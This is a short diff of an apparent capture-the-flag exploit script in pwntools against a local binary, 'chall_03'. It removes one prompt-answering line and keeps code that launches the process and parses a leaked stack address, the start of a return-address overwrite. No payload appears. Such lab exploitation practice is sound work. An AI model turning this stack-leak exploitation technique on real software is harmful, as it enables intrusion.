@@ -1,7 +1,6 @@
 from pwn import *
 binary = context.binary = ELF('./chall_03')
 p=process(binary.path)
-p.sendlineafter('She sellz sea shellz by the return address\n','foobar')
 p.recvuntil('Here\'s a leak :)')
 _ = p.recvline().strip()
 stack = int(_,16)
